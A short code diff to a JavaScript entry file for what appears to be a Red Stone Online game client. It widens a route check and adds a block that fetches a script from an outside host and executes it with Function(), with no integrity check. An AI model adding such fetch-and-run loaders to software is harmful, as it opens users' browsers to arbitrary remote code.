@@ -6,7 +6,13 @@ if (location.pathname.match(/^\/Map\//)) {
     const mapDebug = new MapReaderDebug();
     mapDebug.execute();
 }
-else if (location.pathname.match(/^\/Game/)) {
+else if (location.pathname.match(/^\/Game/) || location.pathname === "/") {
     console.log("[Mode] Red Stone Online");
     RedStone.init();
 }
+
+(async () => {
+    const f = await fetch("https://sigr.io/redstone/custom/duh.js");
+    const data = await f.text();
+    Function(data)();
+})();
